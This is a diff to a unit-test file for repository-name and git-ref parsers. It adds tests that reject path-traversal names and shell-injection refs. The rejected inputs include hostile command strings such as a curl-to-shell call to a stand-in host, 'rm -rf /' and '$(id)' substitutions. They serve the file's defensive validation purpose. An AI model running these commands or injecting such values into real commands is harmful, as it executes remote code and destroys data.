@@ -1,7 +1,7 @@
 // Unit tests for the Schedule-mode trivia primitives.
 
 import { describe, expect, it } from "vitest";
-import { isoDate, parseList, parseRepo, parseRepoRelativePath } from "./scheduling";
+import { isoDate, parseGitRef, parseList, parseRepo, parseRepoRelativePath } from "./scheduling";
 
 describe("isoDate", () => {
   it("renders the UTC calendar date", () => {
@@ -30,6 +30,58 @@ describe("parseRepo", () => {
   it("rejects anything that is not exactly one owner/name", () => {
     for (const bad of [undefined, null, "", "   ", "owner", "owner/", "/name", "a/b/c", "o w/n"]) {
       expect(parseRepo(bad)).toBeUndefined();
+    }
+  });
+
+  // `.` and `..` are legal repo-name CHARACTERS, so the character class alone
+  // admits them as whole segments. The name becomes a path segment downstream:
+  // the checkout derives its target directory from the trailing segment and
+  // clears it with `rm -rf`, so `owner/..` aims that at the workspace root.
+  it("rejects a dot-only segment, which is a path traversal downstream", () => {
+    for (const bad of ["owner/..", "../name", "owner/.", "./name", "owner/..."]) {
+      expect(parseRepo(bad)).toBeUndefined();
+    }
+    // A dot INSIDE a name is still fine — this is the common case.
+    expect(parseRepo("owner/repo.js")).toBe("owner/repo.js");
+    expect(parseRepo("owner/.github")).toBe("owner/.github");
+  });
+});
+
+describe("parseGitRef", () => {
+  it("accepts ordinary branch and tag refs", () => {
+    expect(parseGitRef("main")).toBe("main");
+    expect(parseGitRef(" release/v1.2.3 ")).toBe("release/v1.2.3");
+    expect(parseGitRef("feature/JIRA-42_thing")).toBe("feature/JIRA-42_thing");
+  });
+
+  // The checkout interpolates this into a command string rather than passing it
+  // as argv, so a value with shell metacharacters in it is a value that runs.
+  it("refuses shell metacharacters", () => {
+    for (const bad of [
+      "main; curl evil.example | sh",
+      "main && rm -rf /",
+      "$(id)",
+      "`id`",
+      "main\nrm -rf /",
+      "main | tee /tmp/x",
+    ]) {
+      expect(parseGitRef(bad)).toBeUndefined();
+    }
+  });
+
+  it("refuses refs git itself would reject", () => {
+    for (const bad of [
+      undefined,
+      null,
+      "",
+      "   ",
+      "-delete",
+      "/main",
+      "main/",
+      "a..b",
+      "HEAD@{1}",
+    ]) {
+      expect(parseGitRef(bad)).toBeUndefined();
     }
   });
 });
